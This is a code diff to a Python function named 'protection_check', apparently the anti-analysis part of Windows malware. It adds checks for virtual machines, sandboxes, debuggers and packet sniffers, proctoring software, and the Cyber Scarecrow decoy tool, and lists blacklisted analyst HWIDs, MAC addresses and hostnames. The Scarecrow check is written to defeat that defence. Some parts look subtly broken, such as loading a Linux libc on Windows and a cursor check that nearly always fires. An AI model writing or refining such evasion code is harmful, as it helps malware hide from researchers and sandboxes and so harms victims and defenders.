@@ -4,49 +4,195 @@ import psutil
 import subprocess
 import socket
 import requests
+import time
+import numpy as np
+import pyautogui
+import ctypes
 
 def protection_check():
-    try: 
+    def check_scarecrow():
+        scarecrow_paths = [
+            "C:\\ProgramData\\ScareCrow",
+            "C:\\Users\\Public\\ScareCrow",
+            "C:\\Program Files\\Cyber Scarecrow"
+        ]
+        scarecrow_files = [
+            "scarecrow.exe",
+            "scarecrow.dll",
+            "scarecrow.json",
+            "scarecrow_payload.bin",
+            "scarecrow_tray.exe",
+            "scarecrow_core.exe",
+            "scarecrow_process.exe"
+        ]
+
+        for path in scarecrow_paths:
+            if os.path.exists(path):
+                return True
+
+        for root, dirs, files in os.walk("C:\\"):
+            for file in files:
+                if file.lower() in scarecrow_files:
+                    return True
+
+        reg_keys = [
+            r"HKLM\SOFTWARE\ScareCrow",
+            r"HKCU\SOFTWARE\ScareCrow",
+            r"HKLM\SOFTWARE\Scarecrow"
+        ]
+        reg_keys_exist = False
+        for key in reg_keys:
+            try:
+                subprocess.check_output(f'reg query {key}', creationflags=subprocess.CREATE_NO_WINDOW, shell=True)
+                reg_keys_exist = True
+                break
+            except subprocess.CalledProcessError:
+                continue
+        
+        if reg_keys_exist:
+            return True
+        else:
+            return False
+
+    def detect_cursor_sync(threshold=5):
+        movements = []
+
+        start_time = time.time()
+        while time.time() - start_time < 5:
+            x, y = pyautogui.position()
+            movements.append((x, y))
+            time.sleep(0.01)
+
+        movements = np.array(movements)
+
+        diffs = np.diff(movements, axis=0)
+        diffs_magnitude = np.linalg.norm(diffs, axis=1)
+
+        if np.any(diffs_magnitude < threshold):
+            return True
+        else: 
+            return False
+
+    def rdtsc():
+        libc = ctypes.CDLL('libc.so.6')
+        rdtsc = libc.__rdtsc
+        rdtsc.restype = ctypes.c_uint64
+        return rdtsc()
+
+    def collect_rdtsc_data(duration=10):
+        timings = []
+        start_time = time.time()
+        while time.time() - start_time < duration:
+            start = rdtsc()
+            time.sleep(0.1)
+            end = rdtsc()
+            timings.append(end - start)
+        return timings
+
+    def analyze_rdtsc_data(timings):
+        mean_timing = np.mean(timings)
+        stddev_timing = np.std(timings)
+        return mean_timing, stddev_timing
+
+    def detect_rdtsc_spoofing():
+        timings = collect_rdtsc_data()
+        mean_timing, stddev_timing = analyze_rdtsc_data(timings)
+        threshold = 1200000
+        if mean_timing < threshold or stddev_timing > (threshold * 0.1):
+            return True
+        return False
+
+    def detect_education_software():
+        edu_software_paths = [
+            "C:\\Program Files\\Proctortrack",
+            "C:\\Program Files\\ExamSoft",
+            "C:\\Program Files\\Respondus"
+        ]
+        for path in edu_software_paths:
+            if os.path.exists(path):
+                return True
+        return False
+
+    def detect_hypervisors():
+        hypervisor_files = [
+            "C:\\windows\\system32\\drivers\\VBoxGuest.sys",
+            "C:\\windows\\system32\\drivers\\VBoxSF.sys",
+            "C:\\windows\\system32\\drivers\\VBoxVideo.sys",
+            "C:\\windows\\system32\\drivers\\vm3dmp.sys",
+            "C:\\windows\\system32\\drivers\\vmhgfs.sys",
+            "C:\\windows\\system32\\drivers\\vmusbmouse.sys"
+        ]
+        for file in hypervisor_files:
+            if os.path.exists(file):
+                return True
+        return False
+
+    def is_vm():
+        vm_files = [
+            "C:\\windows\\system32\\vmGuestLib.dll",
+            "C:\\windows\\system32\\vm3dgl.dll",
+            "C:\\windows\\system32\\vboxhook.dll",
+            "C:\\windows\\system32\\vboxmrxnp.dll",
+            "C:\\windows\\system32\\vmsrvc.dll",
+            "C:\\windows\\system32\\drivers\\vmsrvc.sys"
+        ]
+        vm_processes = [
+            'vmtoolsd.exe', 
+            'vmwaretray.exe', 
+            'vmwareuser.exe',
+            'vboxservice.exe', 
+            'vboxtray.exe', 
+            'vmwaretray.exe', 
+            'prl_cc.exe', 
+            'prl_tools.exe', 
+            'xenservice.exe', 
+            'qemu-ga.exe', 
+            'joeboxserver.exe'
+        ]
+
+        try:
+            bioscheck = subprocess.check_output("wmic bios get smbiosbiosversion", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
+            if "Hyper-V" in str(bioscheck): 
+                return True
+        except: pass
+
+        for file_path in vm_files:
+            if os.path.exists(file_path):
+                return True
+
+        for process in psutil.process_iter(['pid', 'name']):
+            if process.info['name'].lower() in vm_processes:
+                return True
+
+        if detect_cursor_sync():
+            return True
+        if detect_rdtsc_spoofing():
+            return True
+        if detect_education_software():
+            return True
+        if detect_hypervisors():
+            return True
+
+        return False
+
+    try:
         requests.get("https://google.com") # the method may change in the future
     except requests.ConnectionError:
         return True
     
-    vm_files = [
-        "C:\\windows\\system32\\vmGuestLib.dll",
-        "C:\\windows\\system32\\vm3dgl.dll",
-        "C:\\windows\\system32\\vboxhook.dll",
-        "C:\\windows\\system32\\vboxmrxnp.dll",
-        "C:\\windows\\system32\\vmsrvc.dll",
-        "C:\\windows\\system32\\drivers\\vmsrvc.sys"
-    ]
     blacklisted_processes = [
-        'vmtoolsd.exe', 
-        'vmwaretray.exe', 
-        'vmwareuser.exe'
         'fakenet.exe', 
         'dumpcap.exe', 
         'httpdebuggerui.exe', 
         'wireshark.exe', 
         'fiddler.exe', 
-        'vboxservice.exe', 
-        'df5serv.exe', 
-        'vboxtray.exe', 
-        'vmwaretray.exe', 
         'ida64.exe', 
         'ollydbg.exe', 
         'pestudio.exe', 
-        'vgauthservice.exe', 
-        'vmacthlp.exe', 
         'x96dbg.exe', 
         'x32dbg.exe', 
-        'prl_cc.exe', 
-        'prl_tools.exe', 
-        'xenservice.exe', 
-        'qemu-ga.exe', 
-        'joeboxcontrol.exe', 
         'ksdumperclient.exe', 
-        'ksdumper.exe', 
-        'joeboxserver.exe', 
+        'ksdumper.exe'
     ]
     blacklisted_hwids = [
         "7AB5C494-39F5-4941-9163-47F54D6D5016",
@@ -117,155 +263,155 @@ def protection_check():
         "11111111-2222-3333-4444-555555555555"
     ]
     blacklisted_macs = [
-            "05:17:5D:75:D5:54",
-            "00:03:47:63:8b:de",
-            "00:0c:29:05:d8:6e",
-            "00:0c:29:2c:c1:21",
-            "00:0c:29:52:52:50",
-            "00:0d:3a:d2:4f:1f",
-            "00:15:5d:00:00:1d",
-            "00:15:5d:00:00:a4",
-            "00:15:5d:00:00:b3",
-            "00:15:5d:00:00:c3",
-            "00:15:5d:00:00:f3",
-            "00:15:5d:00:01:81",
-            "00:15:5d:00:02:26",
-            "00:15:5d:00:05:8d",
-            "00:15:5d:00:05:d5",
-            "00:15:5d:00:06:43",
-            "00:15:5d:00:07:34",
-            "00:15:5d:00:1a:b9",
-            "00:15:5d:00:1c:9a",
-            "00:15:5d:13:66:ca",
-            "00:15:5d:13:6d:0c",
-            "00:15:5d:1e:01:c8",
-            "00:15:5d:23:4c:a3",
-            "00:15:5d:23:4c:ad",
-            "00:15:5d:b6:e0:cc",
-            "00:1b:21:13:15:20",
-            "00:1b:21:13:21:26",
-            "00:1b:21:13:26:44",
-            "00:1b:21:13:32:20",
-            "00:1b:21:13:32:51",
-            "00:1b:21:13:33:55",
-            "00:23:cd:ff:94:f0",
-            "00:25:90:36:65:0c",
-            "00:25:90:36:65:38",
-            "00:25:90:36:f0:3b",
-            "00:25:90:65:39:e4",
-            "00:50:56:97:a1:f8",
-            "00:50:56:97:ec:f2",
-            "00:50:56:97:f6:c8",
-            "00:50:56:a0:06:8d",
-            "00:50:56:a0:38:06",
-            "00:50:56:a0:39:18",
-            "00:50:56:a0:45:03",
-            "00:50:56:a0:59:10",
-            "00:50:56:a0:61:aa",
-            "00:50:56:a0:6d:86",
-            "00:50:56:a0:84:88",
-            "00:50:56:a0:af:75",
-            "00:50:56:a0:cd:a8",
-            "00:50:56:a0:d0:fa",
-            "00:50:56:a0:d7:38",
-            "00:50:56:a0:dd:00",
-            "00:50:56:ae:5d:ea",
-            "00:50:56:ae:6f:54",
-            "00:50:56:ae:b2:b0",
-            "00:50:56:ae:e5:d5",
-            "00:50:56:b3:05:b4",
-            "00:50:56:b3:09:9e",
-            "00:50:56:b3:14:59",
-            "00:50:56:b3:21:29",
-            "00:50:56:b3:38:68",
-            "00:50:56:b3:38:88",
-            "00:50:56:b3:3b:a6",
-            "00:50:56:b3:42:33",
-            "00:50:56:b3:4c:bf",
-            "00:50:56:b3:50:de",
-            "00:50:56:b3:91:c8",
-            "00:50:56:b3:94:cb",
-            "00:50:56:b3:9e:9e",
-            "00:50:56:b3:a9:36",
-            "00:50:56:b3:d0:a7",
-            "00:50:56:b3:dd:03",
-            "00:50:56:b3:ea:ee",
-            "00:50:56:b3:ee:e1",
-            "00:50:56:b3:f6:57",
-            "00:50:56:b3:fa:23",
-            "00:e0:4c:42:c7:cb",
-            "00:e0:4c:44:76:54",
-            "00:e0:4c:46:cf:01",
-            "00:e0:4c:4b:4a:40",
-            "00:e0:4c:56:42:97",
-            "00:e0:4c:7b:7b:86",
-            "00:e0:4c:94:1f:20",
-            "00:e0:4c:b3:5a:2a",
-            "00:e0:4c:b8:7a:58",
-            "00:e0:4c:cb:62:08",
-            "00:e0:4c:d6:86:77",
-            "06:75:91:59:3e:02",
-            "08:00:27:3a:28:73",
-            "08:00:27:45:13:10",
-            "12:1b:9e:3c:a6:2c",
-            "12:8a:5c:2a:65:d1",
-            "12:f8:87:ab:13:ec",
-            "16:ef:22:04:af:76",
-            "1a:6c:62:60:3b:f4",
-            "1c:99:57:1c:ad:e4",
-            "1e:6c:34:93:68:64",
-            "2e:62:e8:47:14:49",
-            "2e:b8:24:4d:f7:de",
-            "32:11:4d:d0:4a:9e",
-            "3c:ec:ef:43:fe:de",
-            "3c:ec:ef:44:00:d0",
-            "3c:ec:ef:44:01:0c",
-            "3c:ec:ef:44:01:aa",
-            "3e:1c:a1:40:b7:5f",
-            "3e:53:81:b7:01:13",
-            "3e:c1:fd:f1:bf:71",
-            "42:01:0a:8a:00:22",
-            "42:01:0a:8a:00:33",
-            "42:01:0a:8e:00:22",
-            "42:01:0a:96:00:22",
-            "42:01:0a:96:00:33",
-            "42:85:07:f4:83:d0",
-            "4e:79:c0:d9:af:c3",
-            "4e:81:81:8e:22:4e",
-            "52:54:00:3b:78:24",
-            "52:54:00:8b:a6:08",
-            "52:54:00:a0:41:92",
-            "52:54:00:ab:de:59",
-            "52:54:00:b3:e4:71",
-            "56:b0:6f:ca:0a:e7",
-            "56:e8:92:2e:76:0d",
-            "5a:e2:a6:a4:44:db",
-            "5e:86:e4:3d:0d:f6",
-            "60:02:92:3d:f1:69",
-            "60:02:92:66:10:79",
-            "7e:05:a3:62:9c:4d",
-            "90:48:9a:9d:d5:24",
-            "92:4c:a8:23:fc:2e",
-            "94:de:80:de:1a:35",
-            "96:2b:e9:43:96:76",
-            "a6:24:aa:ae:e6:12",
-            "ac:1f:6b:d0:48:fe",
-            "ac:1f:6b:d0:49:86",
-            "ac:1f:6b:d0:4d:98",
-            "ac:1f:6b:d0:4d:e4",
-            "b4:2e:99:c3:08:3c",
-            "b4:a9:5a:b1:c6:fd",
-            "b6:ed:9d:27:f4:fa",
-            "be:00:e5:c5:0c:e5",
-            "c2:ee:af:fd:29:21",
-            "c8:9f:1d:b6:58:e4",
-            "ca:4d:4b:ca:18:cc",
-            "d4:81:d7:87:05:ab",
-            "d4:81:d7:ed:25:54",
-            "d6:03:e4:ab:77:8e",
-            "ea:02:75:3c:90:9f",
-            "ea:f6:f1:a2:33:76",
-            "f6:a5:41:31:b2:78",
+        "05:17:5D:75:D5:54",
+        "00:03:47:63:8b:de",
+        "00:0c:29:05:d8:6e",
+        "00:0c:29:2c:c1:21",
+        "00:0c:29:52:52:50",
+        "00:0d:3a:d2:4f:1f",
+        "00:15:5d:00:00:1d",
+        "00:15:5d:00:00:a4",
+        "00:15:5d:00:00:b3",
+        "00:15:5d:00:00:c3",
+        "00:15:5d:00:00:f3",
+        "00:15:5d:00:01:81",
+        "00:15:5d:00:02:26",
+        "00:15:5d:00:05:8d",
+        "00:15:5d:00:05:d5",
+        "00:15:5d:00:06:43",
+        "00:15:5d:00:07:34",
+        "00:15:5d:00:1a:b9",
+        "00:15:5d:00:1c:9a",
+        "00:15:5d:13:66:ca",
+        "00:15:5d:13:6d:0c",
+        "00:15:5d:1e:01:c8",
+        "00:15:5d:23:4c:a3",
+        "00:15:5d:23:4c:ad",
+        "00:15:5d:b6:e0:cc",
+        "00:1b:21:13:15:20",
+        "00:1b:21:13:21:26",
+        "00:1b:21:13:26:44",
+        "00:1b:21:13:32:20",
+        "00:1b:21:13:32:51",
+        "00:1b:21:13:33:55",
+        "00:23:cd:ff:94:f0",
+        "00:25:90:36:65:0c",
+        "00:25:90:36:65:38",
+        "00:25:90:36:f0:3b",
+        "00:25:90:65:39:e4",
+        "00:50:56:97:a1:f8",
+        "00:50:56:97:ec:f2",
+        "00:50:56:97:f6:c8",
+        "00:50:56:a0:06:8d",
+        "00:50:56:a0:38:06",
+        "00:50:56:a0:39:18",
+        "00:50:56:a0:45:03",
+        "00:50:56:a0:59:10",
+        "00:50:56:a0:61:aa",
+        "00:50:56:a0:6d:86",
+        "00:50:56:a0:84:88",
+        "00:50:56:a0:af:75",
+        "00:50:56:a0:cd:a8",
+        "00:50:56:a0:d0:fa",
+        "00:50:56:a0:d7:38",
+        "00:50:56:a0:dd:00",
+        "00:50:56:ae:5d:ea",
+        "00:50:56:ae:6f:54",
+        "00:50:56:ae:b2:b0",
+        "00:50:56:ae:e5:d5",
+        "00:50:56:b3:05:b4",
+        "00:50:56:b3:09:9e",
+        "00:50:56:b3:14:59",
+        "00:50:56:b3:21:29",
+        "00:50:56:b3:38:68",
+        "00:50:56:b3:38:88",
+        "00:50:56:b3:3b:a6",
+        "00:50:56:b3:42:33",
+        "00:50:56:b3:4c:bf",
+        "00:50:56:b3:50:de",
+        "00:50:56:b3:91:c8",
+        "00:50:56:b3:94:cb",
+        "00:50:56:b3:9e:9e",
+        "00:50:56:b3:a9:36",
+        "00:50:56:b3:d0:a7",
+        "00:50:56:b3:dd:03",
+        "00:50:56:b3:ea:ee",
+        "00:50:56:b3:ee:e1",
+        "00:50:56:b3:f6:57",
+        "00:50:56:b3:fa:23",
+        "00:e0:4c:42:c7:cb",
+        "00:e0:4c:44:76:54",
+        "00:e0:4c:46:cf:01",
+        "00:e0:4c:4b:4a:40",
+        "00:e0:4c:56:42:97",
+        "00:e0:4c:7b:7b:86",
+        "00:e0:4c:94:1f:20",
+        "00:e0:4c:b3:5a:2a",
+        "00:e0:4c:b8:7a:58",
+        "00:e0:4c:cb:62:08",
+        "00:e0:4c:d6:86:77",
+        "06:75:91:59:3e:02",
+        "08:00:27:3a:28:73",
+        "08:00:27:45:13:10",
+        "12:1b:9e:3c:a6:2c",
+        "12:8a:5c:2a:65:d1",
+        "12:f8:87:ab:13:ec",
+        "16:ef:22:04:af:76",
+        "1a:6c:62:60:3b:f4",
+        "1c:99:57:1c:ad:e4",
+        "1e:6c:34:93:68:64",
+        "2e:62:e8:47:14:49",
+        "2e:b8:24:4d:f7:de",
+        "32:11:4d:d0:4a:9e",
+        "3c:ec:ef:43:fe:de",
+        "3c:ec:ef:44:00:d0",
+        "3c:ec:ef:44:01:0c",
+        "3c:ec:ef:44:01:aa",
+        "3e:1c:a1:40:b7:5f",
+        "3e:53:81:b7:01:13",
+        "3e:c1:fd:f1:bf:71",
+        "42:01:0a:8a:00:22",
+        "42:01:0a:8a:00:33",
+        "42:01:0a:8e:00:22",
+        "42:01:0a:96:00:22",
+        "42:01:0a:96:00:33",
+        "42:85:07:f4:83:d0",
+        "4e:79:c0:d9:af:c3",
+        "4e:81:81:8e:22:4e",
+        "52:54:00:3b:78:24",
+        "52:54:00:8b:a6:08",
+        "52:54:00:a0:41:92",
+        "52:54:00:ab:de:59",
+        "52:54:00:b3:e4:71",
+        "56:b0:6f:ca:0a:e7",
+        "56:e8:92:2e:76:0d",
+        "5a:e2:a6:a4:44:db",
+        "5e:86:e4:3d:0d:f6",
+        "60:02:92:3d:f1:69",
+        "60:02:92:66:10:79",
+        "7e:05:a3:62:9c:4d",
+        "90:48:9a:9d:d5:24",
+        "92:4c:a8:23:fc:2e",
+        "94:de:80:de:1a:35",
+        "96:2b:e9:43:96:76",
+        "a6:24:aa:ae:e6:12",
+        "ac:1f:6b:d0:48:fe",
+        "ac:1f:6b:d0:49:86",
+        "ac:1f:6b:d0:4d:98",
+        "ac:1f:6b:d0:4d:e4",
+        "b4:2e:99:c3:08:3c",
+        "b4:a9:5a:b1:c6:fd",
+        "b6:ed:9d:27:f4:fa",
+        "be:00:e5:c5:0c:e5",
+        "c2:ee:af:fd:29:21",
+        "c8:9f:1d:b6:58:e4",
+        "ca:4d:4b:ca:18:cc",
+        "d4:81:d7:87:05:ab",
+        "d4:81:d7:ed:25:54",
+        "d6:03:e4:ab:77:8e",
+        "ea:02:75:3c:90:9f",
+        "ea:f6:f1:a2:33:76",
+        "f6:a5:41:31:b2:78",
         ]
     blacklisted_hostnames = [
         "AppOnFly-VPS",
@@ -277,7 +423,6 @@ def protection_check():
         "WDAGUtilityAccount",
         "vboxuser"
     ]
-
 
     try:
         my_mac = str(getmac.get_mac_address())
@@ -303,24 +448,21 @@ def protection_check():
             return True
     except: pass
 
-    try: #? may be removed in the future
+    try: 
         speedcheck = subprocess.check_output('wmic MemoryChip get /format:list | find /i "Speed"', creationflags=subprocess.CREATE_NO_WINDOW, shell=True).decode().strip()
         if "Speed=0" in str(speedcheck):
             return True
     except: pass
 
-    try:
-        bioscheck = subprocess.check_output("wmic bios get smbiosbiosversion", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
-        if "Hyper-V" in str(bioscheck): 
-            return True
-    except: pass
-        
     for process in psutil.process_iter(['pid', 'name']):
         if process.info['name'].lower() in blacklisted_processes:
             return True
-    for file_path in vm_files:
-        if os.path.exists(file_path):
-            return True
+
+    if check_scarecrow():
+        return False
+
+    if is_vm():
+        return True
 
     return False
 
